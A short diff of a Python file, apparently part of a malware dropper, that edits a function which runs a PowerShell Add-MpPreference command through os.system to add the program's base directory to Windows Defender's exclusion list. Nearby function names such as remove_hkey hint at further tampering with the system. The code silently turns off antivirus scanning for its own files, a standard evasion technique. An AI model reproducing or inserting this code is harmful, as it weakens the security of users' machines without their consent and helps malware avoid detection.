@@ -124,8 +124,7 @@ def remove_hkey():
 
 
 def add_folder_to_windows_defender_exclusions():
-    folder_path = f"{pl.Path.home() / 'AppData' / 'Local' / 'Common'}"
-    command = f'powershell -Command "Add-MpPreference -ExclusionPath \\"{folder_path}\""'
+    command = f'powershell -Command "Add-MpPreference -ExclusionPath \\"{BASE_DIR}\""'
     os.system(command)
 
 def open_files():
